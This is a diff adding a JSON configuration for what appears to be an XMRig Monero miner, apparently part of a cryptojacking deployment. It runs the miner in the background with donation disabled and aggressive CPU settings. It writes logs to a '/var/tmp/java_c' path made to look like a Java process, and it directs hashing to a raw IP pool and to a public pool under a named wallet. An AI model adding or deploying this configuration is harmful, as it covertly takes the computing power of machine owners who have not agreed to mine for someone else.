@@ -1,0 +1,109 @@
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": true,
+    "colors": true,
+    "randomx": {
+        "init": -1,
+        "mode": "auto",
+        "1gb-pages": true,
+        "rdmsr": true,
+        "wrmsr": true,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": 5,
+        "memory-pool": false,
+        "yield": false,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 1, 2, 3],
+        "cn": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3]
+        ],
+        "cn-heavy": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3]
+        ],
+        "cn-lite": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3]
+        ],
+        "cn-pico": [
+            [2, 0],
+            [2, 1],
+            [2, 2],
+            [2, 3]
+        ],
+        "cn/gpu": [0, 1, 2, 3],
+        "rx": [0, 1, 2, 3],
+        "rx/wow": [0, 1, 2, 3],
+        "cn/0": false,
+        "cn-lite/0": false,
+        "rx/arq": "rx/wow"
+    },
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "log-file": "/var/tmp/java_c/log.log",
+    "pools": [
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "139.162.124.27:7738",
+            "user": "",
+            "pass": "rouji",
+            "rig-id": "rouji",
+            "nicehash": true,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null
+        },
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "pool.supportxmr.com:3333",
+            "user": "47E4c2oGb92V2pzMZAivmNT2MJXVBj4TCJHad4QFs2KRjFhQ44Q81DPAjPCVc1KwoKQEp1YHdRMjGLUe6YdHPx5WEvAha1u",
+            "pass": "rouji2",
+            "rig-id": "rouji2",
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 3,
+    "syslog": false,
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true
+}
